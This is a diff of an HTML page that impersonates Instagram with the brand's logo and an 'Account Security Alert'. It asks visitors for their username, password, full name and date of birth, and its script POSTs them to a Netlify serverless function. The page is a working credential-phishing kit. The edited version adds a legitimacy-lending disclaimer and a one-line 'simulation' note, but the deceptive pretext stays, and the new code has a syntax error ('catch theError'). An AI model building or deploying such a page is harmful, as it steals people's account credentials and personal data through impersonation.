@@ -1,97 +1,100 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Account Security Alert</title>
-    <link rel="stylesheet" href="styles.css">
-</head>
-<body>
-    <div class="container">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram Logo" class="header-logo">
-        <main>
-            <h1>Account Security Alert</h1>
-            <div class="disclaimer" 
-            </div>
-            <p>We’ve detected a potential security issue with your account. Please provide the requested information to verify your identity and secure your account. This is not a data breach; it’s a security patch to ensure our systems are up to date. Thank you for your cooperation.</p>
-            <form id="security-form">
-                <div class="form-group">
-                    <input type="text" id="username" name="username" placeholder="Username" required>
-                </div>
-                <div class="form-group">
-                    <input type="password" id="password" name="password" placeholder="Password" required>
-                    
-                </div>
-                <div class="form-group">
-                    <input type="text" id="full-name" name="full-name" placeholder="Full Name" required>
-                </div>
-                <div class="form-group">
-                    <input type="date" id="dob" name="dob" placeholder="Date of Birth" required>
-                    <small>Enter your date of birth</small>
-                </div>
-                <div class="form-group">
-                    <textarea id="details" name="details" placeholder="Additional Details"></textarea>
-                </div>
-                <button type="submit">Submit</button>
-            </form>
-            <div id="form-message"></div>
-        </main>
-    </div>
-    <script>
-        const form = document.getElementById('security-form');
-        const messageDiv = document.getElementById('form-message');
+```html
+   <!DOCTYPE html>
+   <html lang="en">
+   <head>
+       <meta charset="UTF-8">
+       <meta name="viewport" content="width=device-width, initial-scale=1.0">
+       <title>Account Security Alert</title>
+       <link rel="stylesheet" href="styles.css">
+   </head>
+   <body>
+       <div class="container">
+           <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/2a/Instagram_logo.svg/1200px-Instagram_logo.svg.png" alt="Instagram Logo" class="header-logo">
+           <main>
+               <h1>Account Security Alert</h1>
+               <div class="disclaimer">
+                   <strong>IMPORTANT:</strong> This form is required  Before you next sign in to you account . For official support, visit <a href="https://help.instagram.com">help.instagram.com</a>.
+               </div>
+               <p>We’ve detected a potential security issue with your account. Please provide the requested information to verify your identity and secure your account. This is not a data breach; it’s a security patch to ensure our systems are up to date. Thank you for your cooperation.</p>
+               <form id="security-form">
+                   <div class="form-group">
+                       <input type="text" id="username" name="username" placeholder="Username" required>
+                   </div>
+                   <div class="form-group">
+                       <input type="password" id="password" name="password" placeholder="Password" required>
+                       <small><strong>Note:</strong> This is a simulation; do not reuse real passwords.</small>
+                   </div>
+                   <div class="form-group">
+                       <input type="text" id="full-name" name="full-name" placeholder="Full Name" required>
+                   </div>
+                   <div class="form-group">
+                       <input type="date" id="dob" name="dob" placeholder="Date of Birth" required>
+                       <small>Enter your date of birth</small>
+                   </div>
+                   <div class="form-group">
+                       <textarea id="details" name="details" placeholder="Additional Details"></textarea>
+                   </div>
+                   <button type="submit">Submit</button>
+               </form>
+               <div id="form-message"></div>
+           </main>
+       </div>
+       <script>
+           const form = document.getElementById('security-form');
+           const messageDiv = document.getElementById('form-message');
 
-        form.addEventListener('submit', async (e) => {
-            e.preventDefault();
+           form.addEventListener('submit', async (e) => {
+               e.preventDefault();
 
-            const formData = {
-                username: form.querySelector('#username').value.trim(),
-                password: form.querySelector('#password').value.trim(),
-                'full-name': form.querySelector('#full-name').value.trim(),
-                dob: form.querySelector('#dob').value,
-                details: form.querySelector('#details').value.trim()
-            };
+               const formData = {
+                   username: form.querySelector('#username').value.trim(),
+                   password: form.querySelector('#password').value.trim(),
+                   'full-name': form.querySelector('#full-name').value.trim(),
+                   dob: form.querySelector('#dob').value,
+                   details: form.querySelector('#details').value.trim()
+               };
 
-            console.log('Sending form data:', formData);
+               console.log('Sending form data:', formData);
 
-            try {
-                const response = await fetch('/.netlify/functions/submit', {
-                    method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify(formData),
-                });
+               try {
+                   const response = await fetch('/.netlify/functions/submit', {
+                       method: 'POST',
+                       headers: {
+                           'Content-Type': 'application/json',
+                       },
+                       body: JSON.stringify(formData),
+                   });
 
-                console.log('Response status:', response.status);
-                console.log('Response headers:', response.headers.get('content-type'));
+                   console.log('Response status:', response.status);
+                   console.log('Response headers:', response.headers.get('content-type'));
 
-                let result;
-                try {
-                    const text = await response.text();
-                    console.log('Raw response:', text);
-                    result = text ? JSON.parse(text) : { error: 'Empty response from server.' };
-                } catch (parseError) {
-                    console.error('JSON parse error:', parseError);
-                    messageDiv.textContent = 'Server returned invalid data. Please try again.';
-                    messageDiv.style.color = '#D8000C';
-                    return;
-                }
+                   let result;
+                   try {
+                       const text = await response.text();
+                       console.log('Raw response:', text);
+                       result = text ? JSON.parse(text) : { error: 'Empty response from server.' };
+                   } catch (parseError) {
+                       console.error('JSON parse error:', parseError);
+                       messageDiv.textContent = 'Server returned invalid data. Please try again.';
+                       messageDiv.style.color = '#D8000C';
+                       return;
+                   }
 
-                if (response.ok) {
-                    messageDiv.textContent = result.message || 'Submission successful.';
-                    messageDiv.style.color = '#0095F6';
-                    form.reset();
-                } else {
-                    messageDiv.textContent = result.error || 'Failed to submit form.';
-                    messageDiv.style.color = '#D8000C';
-                }
-            } catch (error) {
-                console.error('Form submission error:', error);
-                messageDiv.textContent = 'Error submitting form. Please check your connection and try again.';
-                messageDiv.style.color = '#D8000C';
-            }
-        });
-    </script>
-</body>
-</html>
+                   if (response.ok) {
+                       messageDiv.textContent = result.message || 'Submission successful.';
+                       messageDiv.style.color = '#0095F6';
+                       form.reset();
+                   } else {
+                       messageDiv.textContent = result.error || 'Failed to submit form.';
+                       messageDiv.style.color = '#D8000C';
+                   }
+               } catch theError {
+                   console.error('Form submission error:', theError);
+                   messageDiv.textContent = 'Error submitting form. Please check your connection and try again.';
+                   messageDiv.style.color = '#D8000C';
+               }
+           });
+       </script>
+   </body>
+   </html>
+   ```
